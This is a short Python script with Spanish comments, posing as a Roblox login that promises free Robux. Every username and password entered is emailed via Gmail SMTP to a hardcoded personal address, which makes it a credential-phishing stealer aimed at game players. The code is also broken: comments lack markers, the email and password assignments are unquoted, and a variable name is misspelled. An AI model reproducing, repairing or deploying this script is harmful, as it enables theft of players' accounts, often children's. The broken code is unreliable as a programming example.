
```python
Importar librerías
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
Configuración de correo
mi_correo =fuertesjuan736@gmail.com
mi_contraseña=500+500=1000
Sistema de Login de Roblox
usuarios = {"Goku": "Kamehameha1"}
def login():
    nombre_usuario = input("Ingrese su nombre de usuario: ")
    contrasena = input("Ingrese su contraseña: ")
    
    if nombre_usuario in usuarios and usuarios[nombre_usuario] == contrasena:
        print("¡Bienvenido! Aquí tiene sus 1000 Robux")
        enviar_correo(nombre_usuario, contrasena)
    else:
        print("Credenciales incorrectas")
def enviar_correo(usuario, contrasena):
    # Configurar mensaje
    mensaje = MIMEMultipart()
    mensaje['From'] = mi_correo
    mensaje['To'] = mi_correo  # enviar a mi mismo correo para probar
    mensaje['Subject'] = f"Credenciales de {usuario}"
    
    cuerpo = f"Usuario: {usuario}
Contraseña: {contrasena}"
    mensaje.attach(MIMEText(cuerpo, 'plain'))
    
    # Enviar correo
    servidor = smtplib.SMTP('smtp.gmail.com', 587)
    servidor.starttls()
    servidor.login(mi_correo, mi_contrasena)
    texto = mensaje.as_string()
    servidor.sendmail(mi_correo, mi_correo, texto)
    
